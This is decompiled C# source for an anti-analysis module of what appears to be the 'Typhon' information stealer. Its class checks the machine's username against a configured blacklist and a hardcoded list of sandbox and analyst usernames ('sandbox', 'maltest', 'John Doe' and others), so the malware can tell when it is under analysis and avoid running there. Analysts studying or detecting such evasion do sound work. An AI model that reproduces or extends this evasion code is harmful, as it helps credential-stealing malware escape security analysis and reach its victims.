using System;
using Typhon.Stealer.SystemInfo;

namespace Typhon.Modules.Blacklist
{
	// Token: 0x02000062 RID: 98
	internal class BlacklistedUsernames
	{
		// Token: 0x06000245 RID: 581 RVA: 0x0000D308 File Offset: 0x0000B508
		public static bool IsBlacklisted()
		{
			string[] array = Config.BlacklistedUsernames.Split(new char[]
			{
				'#'
			});
			for (int i = 0; i < array.Length; i++)
			{
				if (array[i] == UserDetails.GetUserName())
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x06000246 RID: 582 RVA: 0x0000D34C File Offset: 0x0000B54C
		public static bool AntiAnalysisBU()
		{
			foreach (string text in new string[]
			{
				"IT-ADMIN",
				"Paul Jones",
				"WALKER",
				"Sandbox",
				"timmy",
				"sandbox",
				"sand box",
				"maltest",
				"malware",
				"virus",
				"John Doe",
				"Emily",
				"CurrentUser",
				"test"
			})
			{
				if (text == UserDetails.GetUserName() || (text.ToLower().Contains(UserDetails.GetUserName()) | UserDetails.GetUserName().ToLower().Contains(text)))
				{
					return true;
				}
			}
			return false;
		}
	}
}
